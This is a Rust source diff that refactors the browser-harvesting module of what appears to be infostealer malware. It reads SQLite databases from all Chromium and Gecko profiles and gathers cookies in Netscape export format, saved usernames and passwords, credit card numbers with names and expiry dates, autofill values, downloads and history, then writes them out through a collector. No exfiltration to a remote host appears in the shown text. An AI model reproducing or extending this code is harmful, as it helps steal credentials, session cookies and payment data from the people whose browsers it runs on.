@@ -5,88 +5,52 @@ mod gecko;
 mod chromium;
 
 extern crate alloc;
-use database::{DatabaseReader, Databases, TableRecord};
+use database::Database;
 
 use crate::alloc::borrow::ToOwned;
 use alloc::string::{String, ToString};
-
+use crate::chromium::ChromiumTask;
+use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
 use collector::Collector;
 use core::fmt::{Display, Formatter};
+use database::bindings::Sqlite3BindingsDatabase;
+use database::DatabaseExt;
+use filesystem::path::Path;
+use filesystem::{FileSystem, WriteTo};
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use utils::path::{Path, WriteToFile};
 use crate::gecko::GeckoTask;
-use crate::chromium::ChromiumTask;
 
-pub struct BrowsersTask<C: Collector> {
-    inner: CompositeTask<C>
+pub(crate) type SqliteDatabase = Sqlite3BindingsDatabase;
+
+pub struct BrowsersTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
 }
 
-impl<C: Collector + 'static> Default for BrowsersTask<C> {
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for BrowsersTask<C, F> {
     fn default() -> Self {
         Self {
             inner: composite_task!(
                 ChromiumTask::new(),
                 GeckoTask::new()
-            )
+            ),
         }
     }
 }
 
-impl_composite_task_runner!(BrowsersTask<C>, "Browsers");
+impl_composite_task_runner!(BrowsersTask<C, F>, "Browsers");
 
-pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, F, R, T, S>(
-    profiles: &[Path],
-    path: P,
-    table: S,
-    mapper: F
-) -> Option<Vec<T>>
-where
-    P: Fn(&Path) -> R,
-    R: AsRef<Path>,
-    F: Fn(&dyn TableRecord) -> Option<T>,
-    T: Ord,
-    S: AsRef<str>
-{
-    collect_and_read_from_all_profiles(profiles, Databases::Sqlite, path, table, mapper)
-}
-
-pub(crate) fn collect_and_read_from_all_profiles<D, P, R, F, T, S>(
-    profiles: &[Path],
-    db_type: D,
-    path: P,
-    table: S,
-    mapper: F
-) -> Option<Vec<T>>
-where
-    D: AsRef<Databases>,
-    P: Fn(&Path) -> R,
-    R: AsRef<Path>,
-    F: Fn(&dyn TableRecord) -> Option<T>,
-    T: Ord,
-    S: AsRef<str>,
-{
-    collect_from_all_profiles(profiles, |profile| {
-        let db_path = path(profile);
-
-        if !db_path.as_ref().is_exists() {
-            None
-        } else {
-            read_and_map_records(&db_type, db_path.as_ref(), table.as_ref(), &mapper)
-        }
-    })
-}
-
-pub(crate) fn collect_from_all_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
+pub(crate) fn collect_unique_from_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
 where
     F: Fn(&Path) -> Option<Vec<T>>,
-    T: Ord
+    T: Ord,
 {
     let mut data: Vec<T> = profiles
         .iter()
-        .filter_map(|profile| f(profile))
+        .filter_map(f)
         .flat_map(|v| v.into_iter())
         .collect();
 
@@ -100,54 +64,80 @@ where
     }
 }
 
-pub(crate) fn to_string_and_write_all<T>(data: &[T], sep: &str, dst: &Path) -> Result<(), u32>
-where
-    T: Display
-{
-    data
-        .iter()
-        .map(|it| it.to_string())
-        .collect::<Vec<String>>()
-        .join(sep)
-        .write_to(dst)
-}
-
-pub(crate) fn read_and_map_records<D, T, F>(
-    db_type: D,
-    path: &Path,
-    table_name: &str,
-    mapper: F,
+pub(crate) fn read_and_collect_unique_records<D, R, T>(
+    profiles: &[Path],
+    filesystem: &impl FileSystem,
+    path: impl Fn(&Path) -> R,
+    table: impl AsRef<str>,
+    mapper: impl Fn(&D::Record) -> Option<T>,
 ) -> Option<Vec<T>>
 where
-    D: AsRef<Databases>,
-    F: Fn(&dyn TableRecord) -> Option<T>,
+    D: Database,
+    R: AsRef<Path>,
+    T: Ord,
 {
-    let bytes = path.read_file().ok()?;
-    let db = db_type.as_ref().read_from_bytes(&bytes).ok()?;
+    collect_unique_from_profiles(profiles, |profile| {
+        let db_path = path(profile);
+
+        if !filesystem.is_exists(db_path.as_ref()) {
+            None
+        } else {
+            read_table_records_mapped::<D, _>(filesystem, db_path.as_ref(), table.as_ref(), &mapper)
+        }
+    })
+}
+
+pub(crate) fn read_table_records_mapped<D, T>(
+    filesystem: &impl FileSystem,
+    path: impl AsRef<Path>,
+    table_name: &str,
+    mapper: impl Fn(&D::Record) -> Option<T>,
+) -> Option<Vec<T>>
+where
+    D: Database,
+{
+    let path = path.as_ref();
+
+    let db: D = DatabaseExt::from_path(filesystem, path).ok()?;
     let table = db.read_table(table_name)?;
 
-    let records = table
-        .filter_map(|record| mapper(&record))
-        .collect();
+    let records = table.filter_map(|record| mapper(&record)).collect();
 
     Some(records)
 }
 
+pub(crate) fn to_string_and_write_all<F, T>(
+    data: &[T],
+    sep: &str,
+    filesystem: &F,
+    dst: &Path,
+) -> Result<(), u32>
+where
+    T: Display,
+    F: FileSystem,
+{
+    data.iter()
+        .map(|it| it.to_string())
+        .collect::<Vec<String>>()
+        .join(sep)
+        .write_to(filesystem, dst)
+}
+
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct Cookie {
-    pub host_key: String,
-    pub name: String,
-    pub value: String,
-    pub path: String,
-    pub expires_utc: i64
+    pub host_key: Arc<str>,
+    pub name: Arc<str>,
+    pub value: Arc<str>,
+    pub path: Arc<str>,
+    pub expires_utc: i64,
 }
 
 impl Display for Cookie {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
         write!(
-            f, 
-           "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r", 
-           self.host_key, self.path, self.expires_utc, self.name, self.value
+            f,
+            "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r",
+            self.host_key, self.path, self.expires_utc, self.name, self.value
         )
     }
 }
@@ -171,9 +161,9 @@ impl Display for Bookmark {
 
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct AutoFill {
-    pub name: String,
-    pub value: String,
-    pub last_used: i64
+    pub name: Arc<str>,
+    pub value: Arc<str>,
+    pub last_used: i64,
 }
 
 impl Display for AutoFill {
@@ -189,11 +179,11 @@ impl Display for AutoFill {
 
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct CreditCard {
-    pub name_on_card: String,
+    pub name_on_card: Arc<str>,
     pub expiration_month: i64,
     pub expiration_year: i64,
-    pub card_number: String,
-    pub use_count: i64
+    pub card_number: Arc<str>,
+    pub use_count: i64,
 }
 
 impl Display for CreditCard {
@@ -210,8 +200,8 @@ impl Display for CreditCard {
 
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct Download {
-    pub saved_as: String,
-    pub url: String
+    pub saved_as: Arc<str>,
+    pub url: Arc<str>,
 }
 
 impl Display for Download {
@@ -227,9 +217,9 @@ impl Display for Download {
 
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct Password {
-    pub origin: Option<String>,
-    pub username: Option<String>,
-    pub password: Option<String>
+    pub origin: Option<Arc<str>>,
+    pub username: Option<Arc<str>>,
+    pub password: Option<Arc<str>>,
 }
 
 impl Display for Password {
@@ -248,9 +238,9 @@ impl Display for Password {
 
 #[derive(PartialEq, Ord, Eq, PartialOrd)]
 pub(crate) struct History {
-    pub url: String,
-    pub title: String,
-    pub last_visit_time: i64
+    pub url: Arc<str>,
+    pub title: Arc<str>,
+    pub last_visit_time: i64,
 }
 
 impl Display for History {
@@ -259,8 +249,7 @@ impl Display for History {
             f,
             "Title: {}\n\
             Url: {}",
-            self.title,
-            self.url,
+            self.title, self.url,
         )
     }
 }
